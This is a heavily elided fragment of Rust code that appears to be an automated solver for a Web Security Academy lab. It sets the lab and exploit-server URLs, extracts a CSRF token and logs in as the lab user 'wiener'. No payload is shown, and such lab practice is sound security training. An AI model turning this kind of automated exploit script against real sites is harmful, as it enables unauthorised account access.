...
const LAB_URL: &str = "https://0a8700ed0322e8d4844a4c5100dd006a.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0ae500760308e85984294b0101a100af.exploit-server.net";
...
fn main() {
    ...
    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token to login.. ");
    flush_terminal();
    ...
    let login_as_wiener = login_as_wiener(&csrf_token);
...
fn login_as_wiener(csrf_token: &str) -> Response {
    WEB_CLIENT
